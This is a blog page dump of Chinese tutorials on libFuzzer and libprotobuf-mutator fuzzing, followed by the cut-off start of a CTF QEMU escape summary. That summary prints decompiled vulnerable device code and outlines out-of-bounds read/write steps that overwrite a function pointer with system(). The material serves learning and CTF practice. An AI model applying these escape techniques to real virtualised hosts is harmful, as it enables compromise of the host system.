target，就是去实现LLVMFuzzerTestOneInput，下面是文档给出的示例，就是实现一个函数，将Data这个字节数组，传递给你要测试的API。 12345// fuzz_target.ccextern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) &#123; DoSomethingInterestingWithMyAPI(Data, Size); return 0; // Non-zero return values are reserved for future use.&#125; 有以下注意事项：1、fuzzing引擎会在同一个进程用不同的输入执行LLVMFuzzerTestOneInput很多次2、LLVMFuzzerTestOneInput比如容忍任何形式的输入（空，很长的数据，格式错误的数据等）3、任何输入都不能调用exit退出（毕竟还要继续fuzz啊）4、可以使用线程，应该线程也应在函数结束前结束，不知道对不对，后面是原文（It may use threads but ideally all threads should be joined at the end of the function.）5、必须具有确定性，因为不确定性降低fuzz的效率（比如不会根据输入去随机选择路径）6、必须快，避免立方以上的复杂性，进行日志记录或者过多的内存消耗7、理想的情况下，不要修改任何的全局状态8、通常目标约窄越好，比如目标可以解析多种数据格式，就写成多个目标，每个格式一个 使用libfuzzerClang6.0开始包含了libfuzzer， 使用就是在编译时使用-fsanitize=fuzzer即可，当然也可以加上 AddressSanitizer (ASAN)，UndefinedBehaviorSanitizer (UBSAN)，以及MemorySanitizer (MSAN)，下面是例子 1234clang -g -O1 -fsanitize=fuzzer mytarget.c # Builds the fuzz target w/o sanitizersclang -g -O1 -fsanitize=fuzzer,address mytarget.c # Builds the fuzz target with ASANclang -g -O1 -fsanitize=fuzzer,signed-integer-overflow mytarget.c # Builds the fuzz target with a part of UBSANclang -g -O1 -fsanitize=fuzzer,memory mytarget.c # Builds the fuzz target with MSAN 当然也可以单独编译libfuzzer，之后链接起来就可以了（这是以前文档的做法了，当然假如你想使用最新的libfuzzer也就只能像上面那样了） 1clang -fsanitize-coverage=trace-pc-guard -fsanitize=address your_lib.cc fuzz_target.cc libFuzzer.a -o my_fuzzer 语料库libfuzzer可以在没有任何初始种子的情况下工作，但是如果被测库接受复杂的结构化输入，效率将会降低。 所以对于一些结构化的输入最好提供语料库（原始样本），这样可以提高效率 如果语料库很大，可以先将其最小化，同事保留完成的覆盖率，使用-merge=1即可 12mkdir NEW_CORPUS_DIR # Store minimized corpus here../my_fuzzer -merge=1 NEW_CORPUS_DIR FULL_CORPUS_DIR 假如想将其他的语料库加到现在的，只讲有新覆盖率的加入 1./my_fuzzer -merge=1 CURRENT_CORPUS_DIR NEW_POTENTIALLY_INTERESTING_INPUTS_DIR 运行最好创建一个目录，里面包含初始的“种子”样本输入 12mkdir CORPUS_DIRcp /some/input/samples/* CORPUS_DIR 之后运行就行，当然可以加一些参数 1./my_fuzzer CORPUS_DIR # -max_len=1000 -jobs=20 ... 一旦fuzzer发现了有趣的testcase，就是能够触发新的路径的testcase，就会添加到CORPUS_DIR 默认情况，fuzzer会持续运行，直到发现一个bug，任何的crash或者sanitizer的报错，都会停止fuzzing，之后保存触发crash的样本会默认会保存到当前目录，通常命名为crash-&lt;sha1&gt;, leak-&lt;sha1&gt;, 或者 timeout-&lt;sha1&gt; 并行fuzz每个libfuzzer进程都是单线程，除非这个库自己起了多线程。 但是可以多个libfuzzer共享一个语料库目录，那么一个模糊器进程找到的任何新输入将对其他模糊器进程可用（除非你是用-reload=0关闭了这个reload预料库的功能） 我们可以通过-jobs=N来控制，N个fuzzing jobs必须完成它的使命（就是找到bug或者time/iteration达到我们限制的上限了），jobs是在worker进程中运行的，默认使用一半可用的cpu核心；当然我们可以用参数-workers=N指定worker的个数。比如，在一个12核的机器使用-jobs=30 ，就默认运行6个worker，最好的情况每个worker可能5个bug fork模式这还是一个实验的模式，-fork=N表示并行的jobs的数量，这个应该跟上面的jobs不是同一个 这个模式在每个process中开启了oom-, timeout-, and crash-resistant 最上层的libfuzzer不会做任何fuzzing，会产生最多N个并发的子进程，并为子进程提供corpus的小的随机子集。子进程退出后，最上层的libfuzzer会将其产生的corpus合并到主corpus 下面是相关的一些flags： 123456-ignore_oomsTrue by default. If an OOM happens during fuzzing in one of the child processes, the reproducer is saved on disk, and fuzzing continues.（默认为true，如果子进程发生Out of memory，会保存输入，但fuzzing继续）-ignore_timeoutsTrue by default, same as -ignore_ooms, but for timeouts.（忽略超时）-ignore_crashesFalse by default, same as -ignore_ooms, but for all other crashes.（默认是false，开启会忽略所有错误） 这个其实是想最终将-jobs = N和-workers = N替换为-fork = N。 merge恢复有时候合并较大的语料库，比较耗时，kill掉之后也可以恢复，需要使用-merge_control_file（指定用于合并过程的控制文件） 推荐使用killall -SIGUSR1 /path/to/fuzzer/binary来优雅地kill 下面是官方例子 12345678910111213141516% rm -f SomeLocalPath% ./my_fuzzer CORPUS1 CORPUS2 -merge=1 -merge_control_file=SomeLocalPath...MERGE-INNER: using the control file &apos;SomeLocalPath&apos;...# While this is running, do `killall -SIGUSR1 my_fuzzer` in another console==9015== INFO: libFuzzer: exiting as requested# This will leave the file SomeLocalPath with the partial state of the merge.# Now, you can continue the merge by executing the same command. The merge# will continue from where it has been interrupted.% ./my_fuzzer CORPUS1 CORPUS2 -merge=1 -merge_control_file=SomeLocalPath...MERGE-OUTER: non-empty control file provided: &apos;SomeLocalPath&apos;MERGE-OUTER: control file ok, 32 files total, first not processed file 20... 运行选项可以传递零个或多个语料库目录作为命令行参数。模糊器将从这些语料库目录中的每一个中读取测试输入，并且所生成的任何新测试输入将被写回到第一个语料库目录中。 1./fuzzer [-flag1=val1 [-flag2=val2 ...] ] [dir1 [dir2 ...] ] 如果给的是文件列表不是目录，那就是相当于回归测试，漏洞复现了 文档中已经对-flag列得比较详细了，我就不复制了，你用-help=1得到的信息启示更详细 但是列一些比较有趣的/常用的 1234567891011-max_len：最大长度-timeout：超时时间-merge：这个用来合并语料库的-minimize_crash：将提供的crash input最小化，可以与`-runs=N or -max_total_time=N `一起使用-jobs：jobs的数量-workers：指定workers的数量-dict：指定字典-reduce_inputs：尝试减少输入的大小，同时保留其全部功能集；默认就为1了。-only_ascii：默认是0，就是只生成ASCII中可打印的以及空格，应该tab也算-artifact_prefix：指定crash的路径前缀-exact_artifact_path：指定crash文件的名字，并行fuzz的时候就不要使用了 输出解读文档说信息是输出到stderr，比如下面的例子 1234567891011INFO: Seed: 1523017872INFO: Loaded 1 modules (16 guards): [0x744e60, 0x744ea0),INFO: -max_len is not provided, using 64INFO: A corpus is not provided, starting from an empty corpus#0 READ units: 1#1 INITED cov: 3 ft: 2 corp: 1/1b exec/s: 0 rss: 24Mb#3811 NEW cov: 4 ft: 3 corp: 2/2b exec/s: 0 rss: 25Mb L: 1 MS: 5 ChangeBit-ChangeByte-ChangeBit-ShuffleBytes-ChangeByte-#3827 NEW cov: 5 ft: 4 corp: 3/4b exec/s: 0 rss: 25Mb L: 2 MS: 1 CopyPart-#3963 NEW cov: 6 ft: 5 corp: 4/6b exec/s: 0 rss: 25Mb L: 2 MS: 2 ShuffleBytes-ChangeBit-#4167 NEW cov: 7 ft: 6 corp: 5/9b exec/s: 0 rss: 25Mb L: 3 MS: 1 InsertByte-... 首先是输出有关fuzzer的选项和配置的信息，包括当前的初始种子，当然你可以通过-seed=N来指定 接下来就是输出事件，还有统计信息， 事件有下面的 1234567READ：fuzzer已经从语料库目录读取了所有输入样本INITED：模糊器已完成初始化，包括运行语料库中的所有样本NEW：发现新路径，并将输入保存到语料库目录REDUCE：找到一个更好，一般指更小的输入触发以前的路径（设置-reduce_inputs=0，可以禁用）pulse：fuzzer已经生成2^n的输入（主要是定期生成让用户知道模糊器仍在工作）DONE：模糊测试完成，达到了迭代限制（-runs）或者时间限制（-max_total_time）RELOAD：fuzzer定期从语料库重新加载输入，这样，就可以发现其他模糊测试工具发现的输入 每一行的统计信息： 123456cov：当前语料库所衣服挂的代码块或者边数ft：libfuzzer用不同的signals来评估代码覆盖率：边覆盖率，边的数量，value profiles，间接调用和被调用等，将他们合并在一起，就是features (ft)corp：当前内存中测试的语料库的数量还有大小（单位为bytes）lim：当前限制的输入长度，随着时间推移，会增加到-max_lenexec/s：每秒的迭代次数rss：当前内存的消耗 对于NEW和REDUCE事件，还有有关产生新输入的变异操作的信息： 123L：新输入的大小MS: &lt;n&gt; &lt;operations&gt; 用于生成输入的变异操作的计数和变异方法。 例子123456789101112131415cat &lt;&lt; EOF &gt; test_fuzzer.cc#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) &#123; if (size &gt; 0 &amp;&amp; data[0] == &apos;H&apos;) if (size &gt; 1 &amp;&amp; data[1] == &apos;I&apos;) if (size &gt; 2 &amp;&amp; data[2] == &apos;!&apos;) __builtin_trap(); return 0;&#125;EOF# Build test_fuzzer.cc with asan and link against libFuzzer.clang++ -fsanitize=address,fuzzer test_fuzzer.cc# Run the fuzzer with no corpus../a.out 更多例子可以在这里看到： https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md 进阶功能字典使用-dict=DICTIONARY_FILE指定，这样应该可以快速绕过magic values 使用字典可能会大大提高搜索速度。 字典语法类似于AFL的-x选项所使用的语法。 12345678910# Lines starting with &apos;#&apos; and empty lines are ignored.# Adds &quot;blah&quot; (w/o quotes) to the dictionary.kw1=&quot;blah&quot;# Use \\\\ for backslash and \\&quot; for quotes.kw2=&quot;\\&quot;ac\\\\dc\\&quot;&quot;# Use \\xAB for hex valueskw3=&quot;\\xF7\\xF8&quot;# the name of the keyword followed by &apos;=&apos; may be omitted:&quot;foo\\x0Abar&quot; Tracing CMP instructions跟踪CMP指令 编译的时候加上：-fsanitize-coverage=trace-cmp libFuzzer将拦截CMP指令并根据截获的CMP指令的参数去引导突变。 这可能减缓模糊的速度，但是很有可能会改善结果。 Value Profile必须开启上面的编译标志，运行的时候加上-use_value_profile=1，之后fuzzer就会收集比较指令的参数的value profiles，并将一些新的values作为新的覆盖。 实现的操作如下：1、编译器通过对所有CMP指令的插桩，获取两个参数2、获取两个参数后计算 (caller_pc&amp;4095) | (popcnt(Arg1 ^ Arg2) &lt;&lt; 12)，使用这个值，在bitset中设置一个bit3、在 bitset 中设置了新的bit说明找到新路径了 此功能可能会发现许多有趣的输入，但是有两个缺点。 首先，可能会导致速度降低2倍。 其次，语料库可能增长数倍。 Fuzzer-friendly build mode1、一些软件使用伪随机数生成器，导致可能同一个输入，但是导致路径不一样2、或者png会有校验和 我们可以用FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION这个宏来使代码更加友好，下面是例子 12345678void MyInitPRNG() &#123;#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION // In fuzzing mode the behavior of the code should be deterministic. srand(0);#else srand(time(0));#endif&#125; 与afl一起fuzzlibfuzzer可以使用afl的发现的语料库，比如下面的例子 12./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@./llvm-fuzz testcase_dir findings_dir # Will write new tests to testcase_dir 当然afl也可以fuzz，LLVMFuzzerTestOneInput写的目标，具体可以看这：https://github.com/llvm/llvm-project/tree/master/compiler-rt/lib/fuzzer/afl 我的fuzzer是否优秀？这个可以通过查看代码覆盖率来衡量，看看我们的语料库或者LLVMFuzzerTestOneInput函数是否有改进的空间 https://clang.llvm.org/docs/SourceBasedCodeCoverage.html 具体例子可以看这个 https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md#visualizing-coverage 自定义的变异我们可以自定义变异，可以参考： https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md 启动初始化如果这个库启动的时候需要初始化，有几种方式， 比如在LLVMFuzzerTestOneInput里面，（或者有时候是全局变量 ，直接在全局方位初始化得了） 123extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) &#123; static bool Initialized = DoInitialization(); ... 此外，我们还可以定义一个LLVMFuzzerInitialize，建议你确实需要argc和argv的时候才使用 1234extern &quot;C&quot; int LLVMFuzzerInitialize(int *argc, char ***argv) &#123; ReadAndMaybeModify(argc, argv); return 0;&#125; 泄露使用AddressSanitizer 或者 LeakSanitizer 构建的程序会在程序关闭后检查内存泄露 但是进程内的模糊测试是不方便的，因为一旦发现导致内存泄露的突变立即去报告这个内存泄露，每次变异后都去检测代价太大 默认情况，libfuzzer在每次变异时会计算malloc和free调用的次数，如果次数不匹配（但是并不是意味着内存泄露），libfuzzer会给到LeakSanitizer过一下，如果确实泄露，才会复制报告，进程退出 如果目标存在大量内存泄露，而且禁止了泄露检查，那么会耗尽内存 开发libfuzzer在MacOS和Linux上，libfuzzer是LLVM项目的一部分。 其他系统可使用-DLIBFUZZER_ENABLE=YES来请求编译libfuzzer 编译tests可以使用DLIBFUZZER_ENABLE_TESTS=ON 参考https://github.com/Dor1s/libfuzzer-workshophttps://docs.google.com/presentation/d/1pbbXRL7HaNSjyCHWgGkbpNotJuiC4O7L_PDZoGqDf5Q/edit#slide=id.p4https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.mdhttps://chromium.googlesource.com/chromium/src/testing/libfuzzer/+/HEAD/https://chromium.googlesource.com/chromium/src/testing/libfuzzer/+/HEAD/getting_started.md","categories":[],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.giantbranch.cn/tags/fuzzing/"},{"name":"libfuzzer","slug":"libfuzzer","permalink":"https://www.giantbranch.cn/tags/libfuzzer/"}]},{"title":"libprotobuf-mutator学习","slug":"libprotobuf-mutator学习","date":"2020-03-06T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2020/03/06/libprotobuf-mutator学习/","link":"","permalink":"https://www.giantbranch.cn/2020/03/06/libprotobuf-mutator学习/","excerpt":"","text":"简介Protocol Buffers是一种序列化数据结构的协议。他是Google的开发的，而且与语言无关，与平台无关的可扩展机制，用于对结构化数据进行序列化（例如XML），但更小，更快，更简单。您定义要一次构造数据的方式，然后可以使用生成的特殊源代码轻松地使用各种语言在各种数据流中写入和读取结构化数据。 下面跟着一个台湾大佬实践了一下，并比较了下普通的libfuzzer 编译官方得README写的很清楚，首先得装clang，这个直接用ubuntu的apt或者自己下载编译或者直接下载bin文件都可以 下面就粘贴一下官方的编译流程 123sudo apt-get updatesudo apt-get install protobuf-compiler libprotobuf-dev binutils cmake \\ ninja-build liblzma-dev libz-dev pkg-config autoconf libtool 之后编译和测试（cmake有修改，加上了-DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON） 1234mkdir buildcd buildcmake .. -GNinja -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ONninja check 这个编译有坑，事实并不是编译的时候出错，是最后测试包含在编译里，所以应该不影响使用，但这个问题也可以解决 实际在LibFuzzerExampleTest中两个测试失败，根据issues：https://github.com/google/libprotobuf-mutator/issues/108，是编译测试时没开启ASAN，导致测试的样本可能没有崩溃输出，导致测试失败，所以编译失败了 1234567891011121314Expected equality of these values: kDefaultLibFuzzerError Which is: 77 GetError(RunFuzzer(&quot;libfuzzer_bin_example&quot;, 1000, 10000000)) Which is: 0[ FAILED ] LibFuzzerExampleTest.Binary (471621 ms)[----------] 2 tests from LibFuzzerExampleTest (1605469 ms total)[----------] Global test environment tear-down[==========] 2 tests from 1 test suite ran. (1605469 ms total)[ PASSED ] 0 tests.[ FAILED ] 2 tests, listed below:[ FAILED ] LibFuzzerExampleTest.Text[ FAILED ] LibFuzzerExampleTest.Binary 所以dende给出了解决方案，再ninja check即可 https://github.com/google/libprotobuf-mutator/compare/master...dende:master 最后就是安装（ninja其实已经ninja: no work to do.，check把该做的都做了） 12ninjasudo ninja install Simple protobuf exampleprotoc程序需要使用libprotobuf-mutator/build/external.protobuf/bin/protoc编译，如果使用apt安装的进行编译，编译后得文件是不能使用的，会报错 1~/libprotobuf-mutator/build/external.protobuf/protoc ./test.proto --cpp_out=./ 会生成XXX.pb.cc和XXX.pb.h,XXX.pb.h是我们程序include的头文件，XXX.pb.cc是编译链接的时候使用 作者写了个Makefile，通过执行make，可以看到编译命令是 1clang++-9 -o test_proto test_proto.cc test.pb.cc /home/pwn/libprotobuf-mutator/build/external.protobuf/lib/libprotobufd.a -I/home/pwn/libprotobuf-mutator/build/external.protobuf/include 那么运行 123pwn@ubuntu:~/libprotobuf-mutator_fuzzing_learning/1_simple_protobuf/genfiles$ ./test_proto101testtest 通过这个实验，就是我们可以通过Protocol Buffers可以方便地定义数据结构，之后可以用set方法设置结构中的值，当然读取也很简单了 Combine libprotobuf-mutator with libfuzzer先看harness.cc，就一个FuzzTEST函数 这个是先编译harness.cc成harness.o 1clang++-9 -g -fsanitize=fuzzer,address -c -DLLVMFuzzerTestOneInput=FuzzTEST harness.cc 之后在编译链接lpm_libfuzz.cc 1clang++-9 -g -fsanitize=fuzzer,address -o lpm_libfuzz harness.o lpm_libfuzz.cc test.pb.cc /home/pwn/libprotobuf-mutator/build/src/libfuzzer/libprotobuf-mutator-libfuzzer.so /home/pwn/libprotobuf-mutator/build/src/libprotobuf-mutator.so /home/pwn/libprotobuf-mutator/build/external.protobuf/lib/libprotobufd.a -I/home/pwn/libprotobuf-mutator/build/external.protobuf/include -I/home/pwn/libprotobuf-mutator 运行需要那两个库 12345678910111213141516pwn@ubuntu:~/libprotobuf-mutator_fuzzing_learning/2_libprotobuf_libfuzzer$ ./lpm_libfuzz./lpm_libfuzz: error while loading shared libraries: libprotobuf-mutator-libfuzzer.so.0: cannot open shared object file: No such file or directorypwn@ubuntu:~/libprotobuf-mutator_fuzzing_learning/2_libprotobuf_libfuzzer$ ldd ./lpm_libfuzz linux-vdso.so.1 (0x00007ffe4c751000) libstdc++.so.6 =&gt; /usr/lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007fba4e99f000) libprotobuf-mutator-libfuzzer.so.0 =&gt; not found libprotobuf-mutator.so.0 =&gt; not found libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007fba4e601000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fba4e3e2000) librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007fba4e1da000) libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fba4dfd6000) libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007fba4ddbe000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fba4d9cd000) /lib64/ld-linux-x86-64.so.2 (0x00007fba4ed28000)pwn@ubuntu:~/libprotobuf-mutator_fuzzing_learning/2_libprotobuf_libfuzzer$ sudo ln -s /home/pwn/libprotobuf-mutator/build/src/libfuzzer/libprotobuf-mutator-libfuzzer.so.0 /lib/x86_64-linux-gnu/libprotobuf-mutator-libfuzzer.so.0pwn@ubuntu:~/libprotobuf-mutator_fuzzing_learning/2_libprotobuf_libfuzzer$ sudo ln -s /home/pwn/libprotobuf-mutator/build/src/libprotobuf-mutator.so.0 /usr/lib/x86_64-linux-gnu/libprotobuf-mutator.so.0 再运行即可 我通过ida看了下，发现比普通的libfuzzer相比，就是将libfuzzer的data转化为protobuf之后我们对protobuf处理后再传给要fuzz的函数 Combine libprotobuf-mutator with libfuzzer ( custom mutator )这个例子是自定义变异 比如这个里面，限制了test.b只能是FUCK或者SHIT 1234567891011121314151617181920212223DEFINE_PROTO_FUZZER(const TEST &amp;test_proto) &#123; /* Register post processor with our custom mutator method */ if(!hasRegister) &#123; protobuf_mutator::libfuzzer::RegisterPostProcessor( TEST::descriptor(), [](google::protobuf::Message* message, unsigned int seed) &#123; TEST *t = static_cast&lt;TEST *&gt;(message); /* test.b will only be &quot;FUCK&quot; or &quot;SHIT&quot; */ if (seed % 2) &#123; t-&gt;set_b(&quot;FUCK&quot;); &#125; else &#123; t-&gt;set_b(&quot;SHIT&quot;); &#125; &#125; ); hasRegister = true; return; &#125; auto s = ProtoToData(test_proto); FuzzTEST((const uint8_t*)s.data(), s.size());&#125; How to combine libprotobuf-mutator and AFL++这是跟AFL++相结合，因为AFL++可以通过指定so文件去自定义变异的方法 跟着github下载编译afl++ https://github.com/vanhauser-thc/AFLplusplus 作者实现了afl++的自定义编译函数 1234567891011121314151617181920212223extern &quot;C&quot; size_t afl_custom_fuzz(uint8_t *buf, size_t buf_size, uint8_t *add_buf,size_t add_buf_size, uint8_t *mutated_out, size_t max_size) &#123; // This function can be named either &quot;afl_custom_fuzz&quot; or &quot;afl_custom_mutator&quot; // A simple test shows that &quot;buf&quot; will be the content of the current test case // &quot;add_buf&quot; will be the next test case ( from AFL++&apos;s input queue ) // Here we implement our own custom mutator static MyMutator mutator; TEST input; // mutate input.a ( integer ) int id = rand() % 305; input.set_a(id); // mutate input.b ( string ) std::string tmp = &quot;&quot;; std::string new_string = mutator.MutateString(tmp, 1000); // use the default protobuf mutator input.set_b(new_string); // convert input from TEST to raw data, and copy to mutated_out const TEST *p = &amp;input; std::string s = ProtoToData(*p); // convert TEST to raw data size_t copy_size = s.size() &lt;= max_size ? s.size() : max_size; // check if raw data&apos;s size is larger than max_size memcpy(mutated_out, s.c_str(), copy_size); // copy the mutated data return copy_size;&#125; 这个是通过宏定义进行加载的so文件——AFL_CUSTOM_MUTATOR_LIBRARY 1234567pwn@ubuntu:~/libprotobuf-mutator_fuzzing_learning/4_libprotobuf_aflpp_custom_mutator$ cat run_fuzz.sh#!/usr/bin/env shLD_LIBRARY_PATH=/usr/local/lib/ \\ # for libprotobuf-mutator-libfuzzer.so.0 and libprotobuf-mutator.so.0AFL_CUSTOM_MUTATOR_LIBRARY=$HOME/libprotobuf-mutator_fuzzing_learning/4_libprotobuf_aflpp_custom_mutator/lpm_aflpp_custom_mutator.so \\AFL_SKIP_CPUFREQ=1 \\afl-fuzz -i ./in -o ./out ./vuln 可以看到运行使用的变异策略是我们自定义的策略 普通libfuzzer与加了libprotobuf-mutator之后的对比整体还是相同的，顺便看看libfuzzer的大概的原理 首先将LLVMFuzzerTestOneInput函数传到fuzzer::FuzzerDriver函数里 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax char **v4; // [rsp+0h] [rbp-10h] int v5; // [rsp+Ch] [rbp-4h] v5 = argc; v4 = (char **)argv; fuzzer::FuzzerDriver(&amp;v5, &amp;v4, (int (__cdecl *)(const char *, ulong))LLVMFuzzerTestOneInput); return result;&#125; 在fuzzer::FuzzerDriver函数里面，就是利用LLVMFuzzerTestOneInput函数初始化Fuzzer，之后尝试读取corpus（语料库）或者Dictionary（字典），最后进行循环地测试 123456789101112131415161718192021222324 v121 = LLVMFuzzerTestOneInput_addr; fuzzer::Fuzzer::Fuzzer(v120, (__int64)LLVMFuzzerTestOneInput_addr, v119, v118, (__int64)a5); fuzzer::FuzzingOptions::~FuzzingOptions(); v122 = *(_QWORD *)v248; for ( j = *(_QWORD *)&amp;v248[8]; j != v122; v122 += 24LL ) &#123; v121 = *(std::Fuzzer::thread ***)v122; v124 = *(_QWORD *)(v122 + 8) - *(_QWORD *)v122; if ( v124 &lt;= 0x40 ) &#123; LOBYTE(v253[0]) = 0; v125 = v124; _interceptor_memcpy(); LOBYTE(v253[0]) = v125; v121 = v253; fuzzer::MutationDispatcher::AddWordToManualDictionary(); &#125; &#125;......//中间有读取样本目录的文件，假如有字典就分析字典等操作......//接下来就是循环测试fuzzer::Fuzzer::Loop((fuzzer::Fuzzer *)v136, (__int64)endptr);...... 接下来看看添加了libprotobuf-mutator之后的情况，不同的就是LLVMFuzzerTestOneInput函数，普通的libfuzzer我们的代码就是自己实现LLVMFuzzerTestOneInput函数，所以LLVMFuzzerTestOneInput就是我们的代码 而libprotobuf-mutator是用libfuzzer传入的data参数转化为protobuf——下面的v16 之后将v16传到TestOneProtoInput函数 12345678910111213141516171819202122libfuzzer_data = v20; v5 = (__int64)v14; *((_DWORD *)v14 + 1) = 0; *(_BYTE *)(v5 + 8) = 0; TEST::TEST(v16); v12 = protobuf_mutator::libfuzzer::LoadProtoInput( 0LL, SBYTE8(libfuzzer_data), (const unsigned __int8 *)libfuzzer_data, (unsigned __int64)v16, v6); if ( v12 &amp; 1 ) &#123; ++byte_753896; TestOneProtoInput(v16); ++byte_753897; &#125; else &#123; ++byte_753895; &#125; TEST::~TEST(v16); 而TestOneProtoInput函数就是DEFINE_PROTO_FUZZER函数的代码 这个从源码也可以看出来https://github.com/google/libprotobuf-mutator/blob/fe76ed648dab1923d9b624b63dc3484fcc10dc76/src/libfuzzer/libfuzzer_macro.h#L28 12345678910111213141516171819202122232425// Defines custom mutator, crossover and test functions using default// serialization format. Default is text.#define DEFINE_PROTO_FUZZER(arg) DEFINE_TEXT_PROTO_FUZZER(arg)// Defines custom mutator, crossover and test functions using text// serialization. This format is more convenient to read.#define DEFINE_TEXT_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(false, arg)#define DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, Proto) \\ extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) &#123; \\ using protobuf_mutator::libfuzzer::LoadProtoInput; \\ Proto input; \\ if (LoadProtoInput(use_binary, data, size, &amp;input)) \\ TestOneProtoInput(input); \\ return 0; \\ &#125; #define DEFINE_PROTO_FUZZER_IMPL(use_binary, arg) \\ static void TestOneProtoInput(arg); \\ using FuzzerProtoType = std::remove_const&lt;std::remove_reference&lt; \\ std::function&lt;decltype(TestOneProtoInput)&gt;::argument_type&gt;::type&gt;::type; \\ DEFINE_CUSTOM_PROTO_MUTATOR_IMPL(use_binary, FuzzerProtoType) \\ DEFINE_CUSTOM_PROTO_CROSSOVER_IMPL(use_binary, FuzzerProtoType) \\ DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, FuzzerProtoType) \\ DEFINE_POST_PROCESS_PROTO_MUTATION_IMPL(FuzzerProtoType) \\ static void TestOneProtoInput(arg) 那么实际DEFINE_PROTO_FUZZER就是我们实现TestOneProtoInput函数 而这个TestOneProtoInput函数是由LLVMFuzzerTestOneInput调用的，看到这，整个流程的通了 12345678#define DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, Proto) \\ extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) &#123; \\ using protobuf_mutator::libfuzzer::LoadProtoInput; \\ Proto input; \\ if (LoadProtoInput(use_binary, data, size, &amp;input)) \\ TestOneProtoInput(input); \\ return 0; \\ &#125; 其实就是写好了LLVMFuzzerTestOneInput，让你自己写TestOneProtoInput 参考https://github.com/google/libprotobuf-mutatorhttps://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning","categories":[],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.giantbranch.cn/tags/fuzzing/"},{"name":"结构化fuzzing","slug":"结构化fuzzing","permalink":"https://www.giantbranch.cn/tags/结构化fuzzing/"}]},{"title":"CTF QEMU 虚拟机逃逸总结","slug":"CTF QEMU 虚拟机逃逸总结","date":"2020-01-15T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2020/01/15/CTF QEMU 虚拟机逃逸总结/","link":"","permalink":"https://www.giantbranch.cn/2020/01/15/CTF QEMU 虚拟机逃逸总结/","excerpt":"","text":"不知什么来源的题目来源：https://kirin-say.top/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/ 漏洞：也不能说漏洞，在mmio_read里面直接给了system的后门 123456789101112signed __int64 __fastcall rfid_read(__int64 a1, unsigned __int64 a2)&#123; size_t v2; // rax if ( ((a2 &gt;&gt; 20) &amp; 0xF) != 15 ) &#123; v2 = strlen(magic_code); if ( !memcmp(code, magic_code, v2) ) system(command); &#125; return 0x42066LL;&#125; 利用：通过rfid_write将code赋值为跟magic_code相等，再设置一下command，最后调用rfid_read即可完成逃逸 BlizzardCTF 2017 Strng题目链接：https://github.com/rcvalle/blizzardctf2017 漏洞：在pmio中对于数组的索引没有限制，导致越界读写 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)&#123; uint64_t result; // rax uint32_t v4; // edx result = -1LL; if ( size == 4 ) &#123; if ( addr ) &#123; if ( addr == 4 ) &#123; v4 = opaque-&gt;addr; if ( !(v4 &amp; 3) ) result = opaque-&gt;regs[v4 &gt;&gt; 2]; &lt;========= 越界读 &#125; &#125; else &#123; result = opaque-&gt;addr; &#125; &#125; return result;&#125;void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123; if ( size == 4 ) &#123; if ( addr ) &#123; if ( addr == 4 ) &#123; v4 = opaque-&gt;addr; if ( !(v4 &amp; 3) ) &#123; v5 = v4 &gt;&gt; 2; if ( (_DWORD)v5 == 1 ) &#123;............ &#125; else &#123; opaque-&gt;regs[v5] = val; &lt;========越界写 &#125; &#125; &#125; &#125;............ &#125;&#125; 利用：1、通过数组越界，获得任意读写来泄露函数指针，计算出system函数地址2、之后改写rand_r函数指针为system，调用rand_r函数即可劫持控制流 HITB-GSEC-2017-babyqemu题目下载：https://github.com/kitctf/writeups/blob/master/hitb-gsec-2017/babyqemu/babyqemu.tar.gz 漏洞：也是对于dma_buf数组的索引没有限制，导致任意地址读写，只不过这个题目需要我们将虚拟地址转化为物理地址 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253void __fastcall hitb_dma_timer(HitbState *opaque)&#123; dma_addr_t v1; // rax __int64 v2; // rdx uint8_t *v3; // rsi dma_addr_t v4; // rax dma_addr_t v5; // rdx uint8_t *v6; // rbp uint8_t *v7; // rbp v1 = opaque-&gt;dma.cmd; if ( v1 &amp; 1 ) &#123; if ( v1 &amp; 2 ) &#123; v2 = (unsigned 